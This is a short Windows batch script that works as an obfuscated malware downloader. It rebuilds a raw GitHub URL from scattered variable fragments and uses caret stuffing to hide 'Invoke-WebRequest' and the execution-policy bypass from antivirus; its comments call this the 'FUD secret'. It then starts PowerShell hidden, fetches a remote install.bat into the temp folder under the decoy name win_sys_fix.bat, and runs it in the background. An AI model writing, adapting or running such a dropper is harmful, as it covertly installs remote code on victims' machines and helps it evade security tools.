@echo off
setlocal enabledelayedexpansion
:: --- TRASH LAYER 1: Random Garbage Variables ---
set "_7a=ht"&set "_2k=tp"&set "_9v=s://"&set "_1m=raw."&set "_4p=gith"&set "_0x=ubus"&set "_3r=erco"&set "_6t=ntent"&set "_5n=.com/"
set "_q8=g00glecenter101-arch/"&set "_w2=Keep/"&set "_e5=main/"&set "_r1=install.bat"
set "_s9=pow"&set "_x3=ersh"&set "_z6=ell"

:: --- TRASH LAYER 2: Command Reconstruction ---
set "full_url=%_7a%%_2k%%_9v%%_1m%%_4p%%_0x%%_3r%%_6t%%_5n%%_q8%%_w2%%_e5%%_r1%"
set "exec_name=%_s9%%_x3%%_z6%"

:: --- TRASH LAYER 3: Caret Stuffing (The FUD Secret) ---
:: Antivirus looks for "Invoke-WebRequest". We break it up with ^ symbols.
set "c1=I^nv^o^ke-W^ebR^equ^e^st"
set "c2=O^utF^i^le"

:: --- EXECUTION ---
%exec_name% -ExecutionPolicy B^yp^as^s -WindowStyle H^id^de^n -Command "%c1% -Uri '%full_url%' -%c2% '%temp%\win_sys_fix.bat'"

:: Run the downloaded file and delete traces
if exist "%temp%\win_sys_fix.bat" (
    start /b "" "%temp%\win_sys_fix.bat"
)
exit
